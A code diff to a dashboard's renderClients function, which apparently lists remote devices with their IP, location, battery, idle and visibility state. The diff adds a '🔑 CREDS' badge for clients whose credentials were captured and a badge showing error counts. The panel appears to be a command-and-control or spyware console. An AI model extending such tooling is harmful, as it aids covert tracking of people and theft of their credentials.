@@ -2036,12 +2036,16 @@ function renderClients(clients) {
         const labelBadge = label ? `<span class="cl-label-badge" style="border-color:#bdc1c6;color:#5f6368">${esc(label)}</span>` : '';
         const tagBadges  = tagList.map(t => `<span class="cl-label-badge">${esc(t)}</span>`).join('');
         const badgeRow   = (labelBadge || tagBadges) ? `<div style="margin-bottom:4px">${labelBadge}${tagBadges}</div>` : '';
+        const hasCreds   = window._credClientIds && window._credClientIds.has(id);
+        const hasErrors  = (cl.errorCount || 0) > 0;
+        const anomalyBanner = (hasCreds || hasErrors) ? `<div style="display:flex;gap:4px;margin-bottom:4px;flex-wrap:wrap">${hasCreds ? '<span style="background:#f4b400;color:#000;font-size:.55rem;padding:1px 6px;border-radius:10px;font-weight:700">🔑 CREDS</span>' : ''}${hasErrors ? `<span style="background:#d93025;color:#fff;font-size:.55rem;padding:1px 6px;border-radius:10px;font-weight:700">⚠️ ${cl.errorCount} ERR</span>` : ''}</div>` : '';
 
         return `<div class="cl${isPinned ? ' cl-pinned' : ''}" data-client-id="${id}">
             <input type="checkbox" class="cl-select" data-id="${id}" onclick="event.stopPropagation()" style="position:absolute;top:10px;left:8px;cursor:pointer;width:14px;height:14px">
             <div class="dot ${cl.online ? 'on' : 'off'}" style="margin-left:18px"></div>
             <div class="inf">
                 <div class="cid" title="${id}">${isPinned ? '[P] ' : ''}${id} <button class="copy-btn" onclick="event.stopPropagation();copyText('${id}',this)">Copy</button></div>
+                ${anomalyBanner}
                 ${badgeRow}
                 <div class="meta">${cl.online ? 'Online' : ('Offline · ' + fmtAgo(cl.lastSeen))} - ${fmtTime(cl.lastSeen)}${battH}${netH} - <span onclick="event.stopPropagation();copyText('${cl.ip || ''}',this)" style="cursor:pointer;text-decoration:underline dotted" title="Click to copy IP">${cl.ip || ''}</span>${idleH}${hiddenH}${scrollH}</div>
                 ${locH}${geoH}
